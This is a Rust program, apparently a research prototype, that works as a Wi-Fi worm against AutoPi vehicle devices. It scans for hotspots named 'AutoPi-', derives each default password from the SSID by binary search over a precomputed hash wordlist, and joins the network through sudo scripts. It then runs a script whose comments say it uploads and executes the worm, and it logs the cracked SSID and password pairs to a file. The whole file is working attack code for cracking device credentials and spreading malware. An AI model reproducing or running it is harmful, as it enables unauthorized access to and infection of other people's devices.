extern crate wifiscanner;

use std::fs::*;
use std::io::prelude::*;
use std::io::BufReader;
use std::io::LineWriter;
use wifiscanner::Wifi;
use std::process::Command;
use std::process::Output;
use std::time::Instant;
use std::collections::HashMap;
use std::thread::sleep;
use std::env;

const HASH_LENGTH: u64 = 16;

static GOAL_SSID_PREFIX: &'static str = "AutoPi-";
static WIFI_INTERFACE: &'static str = "wlan0";
static ROUTE_ENTRY: &'static str = "192.168.4.0/24 dev wlan0 proto kernel scope link";

static HACKED_GATEWAY_ENTRY: &'static str = "via 192.168.4.100 dev wlan0";

fn main() {
    
    //If a list of hacked networks (SSID, password pair) exists create a hash table from it
    //Otherwise create a new list of hacked networks
    let (mut hacked_networks, mut hacked_networks_file) = match OpenOptions::new().append(true).read(true).open("hacked_networks") {
        Ok(mut file) => (read_hacked_networks(&mut file), file),
        Err(_e) => match OpenOptions::new().append(true).read(true).create_new(true).open("hacked_networks") {

            Ok(file) => (HashMap::new(), file),
            Err(_e) => panic!("No hacked networks file could be created"),
        },
    };
    
    // Open wordlist
    let path = "/home/pi/list/list";

    let length_list_file: u64;

    {
        let list_file = File::open(path);
        let list_file = match list_file{
            Ok(file) => file,
            Err(e) => panic!("Could not open list file\n{}", e),
        };

        let metadata = list_file.metadata();
        let metadata = match metadata{
            Ok(data) => data,
            Err(_e) => { println!("Could not get metadata of list file"); return},
        };

        length_list_file = metadata.len();
    };
    
    let amount_hashes_file = length_list_file/HASH_LENGTH;

    //Argument handling
    let cli_args: Vec<String> = env::args().collect();

    //Get signal strength threshold
    let sig_strength_threshold = match cli_args.get(1).unwrap_or(&String::from("Not a number")).parse::<f32>() {
        Ok(sig) => {
            if sig > 0.0 {
                -1.0 * sig
            }
            else {
                sig
            }
        },
        Err(_e) => f32::NEG_INFINITY,
    };
    
    //Get current host SSID
    for argument in env::args() {
        if argument.contains("autopi-") {
            
            let mut host_ssid = String::from("AutoPi-");
            host_ssid.push_str(&(argument[7..]));
            
            match binary_search((&host_ssid[7..]).to_string(), 0, amount_hashes_file-1, path) {
                Ok(host_hash) => { let mut host_pass = host_hash[0..8].to_string();
                                   host_pass.push_str("-"); host_pass.push_str(&host_hash[8..12]);
                                   write_hacked_networks(&host_ssid, &host_pass, &mut hacked_networks_file, &mut hacked_networks)
                },
                Err(e) => println!("Could not get host password\n{}", e),
            }
        }
    }

    //Output of commands
    let mut login_output: Output;
    let mut route_output: Output;
    let mut upload_execute_output: Output;

    let mut ssid: String;
    let mut network_hash: String = String::from("");
    let mut pass: String;
    let mut network_ready: bool;

    let mut time: Instant;

    let mut time_for_wordlist: Instant;
    
    loop { // Main loop that performs hack
        ssid = check_autopi_wifi(&hacked_networks, sig_strength_threshold);
        network_hash = String::from(""); //Control variables are not good for the modularity of the system Sandor
        
        println!("{}", ssid);
        time_for_wordlist = Instant::now();
        match binary_search((&ssid[7..]).to_string(), 0, amount_hashes_file-1, path) {
            Ok(hash) => {
                println!("Time to crack pass: {}", time_for_wordlist.elapsed().as_millis());
                network_hash = hash
            }, // Binary search to crack the password as Burdzovic and Mattson
            Err(error) => println!("{}", error),
        };
        if network_hash != "" { //If new network was detected and password is cracked start infection process
            
            pass = network_hash[0..8].to_string();
            pass.push_str("-");
            pass.push_str(&network_hash[8..12]);
            println!("{}", pass);

            //Execute script to set SSID and password for wpa_supplicant
            login_output = Command::new("sudo").arg("nice").arg("--20").arg("./login.sh").arg(format!("AutoPi-{}", (ssid[7..]).to_string())).arg( format!("{}", pass) ).output().expect("Could not output network to wpa_supplicant");
           
            if login_output.status.success() {
                
                //Command to check kernel routing table
                route_output = Command::new("ip").arg("route").arg("show").output().expect("Could not get route status");
                network_ready = true;
                time = Instant::now();
                while !((String::from_utf8_lossy(&(route_output.stdout))).contains(&WIFI_INTERFACE))  {
                    //Recheck routing table until wlan0 shows up
                    route_output = Command::new("ip").arg("route").arg("show").output().expect("Could not get route status");

                    if time.elapsed().as_secs() >= 30 { // Timeout is 30 seconds for connecting to hotspot
                        let logoff_output = Command::new("sudo").arg("nice").arg("--20").arg("/home/pi/logoff.sh").output().expect("Log off hacked network failed");
                        network_ready = false;
                        println!("Timeout connecting to network");
                        if !logoff_output.status.success() {
                            
                        };
                        break;
                    };
                };
                
                if (String::from_utf8_lossy(&(route_output.stdout))).contains(&HACKED_GATEWAY_ENTRY) { //If AutoPi has network structure of hacked AutoPi
                    //Log off network
                    let logoff_output = Command::new("sudo").arg("nice").arg("--20").arg("/home/pi/logoff.sh").output().expect("Log off hacked network failed");
                    write_hacked_networks(&ssid, &pass, &mut hacked_networks_file, &mut hacked_networks);
                    network_ready = false;
                    if logoff_output.status.success() {
                        
                    };
                };
                //If AutoPi is connected to the target AutoPi hostpot and routes are correct
                if network_ready {
                    //Execute script that uploads and executes worm
                    upload_execute_output = Command::new("sudo").arg("nice").arg("--20").arg("/home/pi/dumpexec.sh").output().expect("Could not upload worm");
                    //If script succeeds save WiFi-credentials and logoff network if necessary
                    if upload_execute_output.status.success() {
                        write_hacked_networks(&ssid, &pass, &mut hacked_networks_file, &mut hacked_networks);
                        let logoff_output = Command::new("sudo").arg("nice").arg("--20").arg("/home/pi/logoff.sh").output().expect("Log off hacked network failed");
                        println!("Success, logging off");
                        if !logoff_output.status.success() {
                            
                        };
                    }
                    //If script doesn't succeed logoff if necessary
                    else {
                        let logoff_output = Command::new("sudo").arg("nice").arg("--20").arg("/home/pi/logoff.sh").output().expect("Log off hacked network failed");
                        println!("No success, checking if logging off is needed");
                        if !logoff_output.status.success() {
                            
                        };
                    }

                } // Loop for uploading/executing worm
                
            }//End of login loop

        } //End of network_hash loop
        network_hash = String::from("");
    } // End of main loop
}

//Helper funktion to scan for WiFi networks in the area
fn scan_wifi() -> Vec<Wifi> {
    let scan_list = wifiscanner::scan();
    let scan_list = match scan_list{
        Ok(data) => data,
        Err(_e) => scan_wifi(),
    };
    scan_list
}


//Blocking funtion that only returns SSID of AutoPi if one is in the area
fn check_autopi_wifi(hacked_networks: &HashMap<String, String>, sig_strength_threshold: f32) -> String {
    let scan_list = scan_wifi();
    for index_wifi in &scan_list {
        if index_wifi.ssid.contains(&GOAL_SSID_PREFIX){ //Check if SSID is prefixed with "AutoPi-"
            
            if hacked_networks.get(&((*index_wifi).ssid)) == None { //Check if AutoPi hotspot has been hacked before
                
                if (index_wifi.signal_level.parse::<f32>().unwrap()) > sig_strength_threshold { //Check if network reaches the signal strength threshold
                    return String::from(((*index_wifi).ssid).clone())
                }
            }
        };
    };
    check_autopi_wifi(hacked_networks, sig_strength_threshold)
}

//Binary search as Burdzovic and Mattsson
fn binary_search(goal_ssid: String, start: u64, end: u64, path: &str) -> Result<String, String> {
    let mut file_handler = match File::open(path){
        Ok(file) => file,
        Err(e) => panic!("Could not open list file\n{}", e),
    };

    let middle = (start + end)/2;
    let current: String = read_list_file(middle, &mut file_handler);
    let last_12 = (&current[20..]).to_string();

    if goal_ssid == last_12 {
        return Ok(current);
    }
    else if start >= end {
        return Err(String::from("No match found"));
    }
    else if goal_ssid < last_12 { // ssid < current
        return binary_search_rec(goal_ssid, start, middle-1, &mut file_handler);
    }
    else if goal_ssid > last_12 { // ssid > current
        return binary_search_rec(goal_ssid, middle+1, end, &mut file_handler);
    }
    Err(String::from("Undefined"))
}
//Helper function for binary_search to perform recursion
fn binary_search_rec(goal_ssid: String, start: u64, end: u64, file_handler: &mut File) -> Result<String, String> {
    let middle = (start + end)/2;
    let current: String = read_list_file(middle, file_handler);
    let last_12 = (&current[20..]).to_string();

    if goal_ssid == last_12 {
        return Ok(current);
    }
    else if start >= end {
        return Err(String::from("No match found"));
    }
    else if goal_ssid < last_12 { // ssid < current
        return binary_search_rec(goal_ssid, start, middle-1, file_handler);
    }
    else if goal_ssid > last_12 { // ssid > current
        return binary_search_rec(goal_ssid, middle+1, end, file_handler);
    }
    Err(String::from("Undefined"))
}

//Read word list
fn read_list_file(list_file_index: u64, file_handler: &mut File) -> String {
    let hash_in_bytes: &mut [u8; HASH_LENGTH as usize] = &mut [0u8; HASH_LENGTH as usize];

    match file_handler.seek(std::io::SeekFrom::Start(HASH_LENGTH * list_file_index)) {
        Err(e) => panic!("Error whilst seeking in list file\n{}", e),
        Ok(pos) => pos,
    };

    match file_handler.read_exact(hash_in_bytes){
        Err(_e) => panic!("Error whilst reading from file"),
        Ok(some) => some
    };

    let mut hash: String = String::new();
    for index_byte in hash_in_bytes {
        if *index_byte <= 15 {
            hash.push_str("0" );
            hash.push_str( &format!("{:x}", index_byte) );
        }
        else {
            hash.push_str( &format!("{:x}", index_byte) );
        };
    };
    hash
}

fn read_hacked_networks(file_handler: &mut File) -> HashMap<String, String> {
    let mut hacked_networks: HashMap<String, String> = HashMap::new();
    /*
    match file_handler.seek(std::io::SeekFrom::Start(0)) {
        Err(_e) => panic!("Error whilst seeking in hacked_networks file to position 0"),
        Ok(pos) => pos,
    };*/

    let mut buffered_reader = BufReader::new(file_handler);

    let mut ssid: String = String::new();
    let mut hash: String = String::new();
    loop {
        match buffered_reader.read_line(&mut ssid) {
            Ok(0) => break,
            Ok(len) => len,
            Err(e) => panic!("Error whilst reading in hacked_networks file\n{}", e),
        };
        ssid.trim_matches('\n');
        match buffered_reader.read_line(&mut hash) {
            Ok(0) => break,
            Ok(len) => len,
            Err(e) => panic!("Error whilst reading in hacked_networks file\n{}", e),
        };
        hash.trim_matches('\n');
        println!("Reading SSID:{} Pass:{}", ssid.trim_matches('\n'), hash.trim_matches('\n'));
        hacked_networks.insert(ssid.trim_matches('\n').to_string(), hash.trim_matches('\n').to_string());
        //hacked_networks.insert(String::from(ssid.clone()), String::from(hash.clone()));
        ssid.clear();
        hash.clear();
    }

    hacked_networks
}

fn write_hacked_networks(ssid: &String, pass: &String, file_handler: &mut File, hacked_networks: &mut HashMap<String, String>) {
    if hacked_networks.get(ssid) == None {
        let mut buffered_writer = LineWriter::new(file_handler);
        let mut ssid_line = ssid.clone();
        ssid_line.push_str("\n");
        let mut pass_line = pass.clone();
        pass_line.push_str("\n");
        
        buffered_writer.write_all(ssid_line.as_bytes());
        buffered_writer.write_all(pass_line.as_bytes());
        println!("Written SSID:{} PASS:{} to hacked_networks file", ssid, pass);
        hacked_networks.insert(String::from(ssid), String::from(pass));
    }
    ()
}
